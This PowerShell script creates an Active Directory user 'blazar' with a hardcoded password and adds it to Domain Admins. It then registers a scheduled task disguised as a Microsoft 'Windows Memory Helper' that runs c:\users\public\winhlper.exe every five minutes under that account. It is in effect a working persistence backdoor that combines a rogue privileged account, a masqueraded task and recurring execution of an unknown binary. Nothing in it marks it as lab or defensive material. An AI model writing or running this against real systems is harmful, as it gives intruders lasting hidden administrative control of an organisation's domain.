Import-Module ActiveDirectory
# Create user account
$username = "blazar"
$password = ConvertTo-SecureString "Pebble007" -AsPlainText -Force
$domain = $env:USERDOMAIN
$domainUsername = $domain + "\" + $username
New-ADUser -Name $username -AccountPassword $password -Enabled $true -PassThru

# Add to the domain admins group
Add-ADGroupMember -Identity "Domain Admins" -Members $username

# Create scheduled task
$taskName = "Windows Memory Helper"
$descriptionTask = "Microsoft Task to Manage Memory due to running in a VM"
$action = New-ScheduledTaskAction -Execute "c:\users\public\winhlper.exe"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $descriptionTask -User $username -Password "Pebble007"

# Verify the Task was Created
Get-ScheduledTask
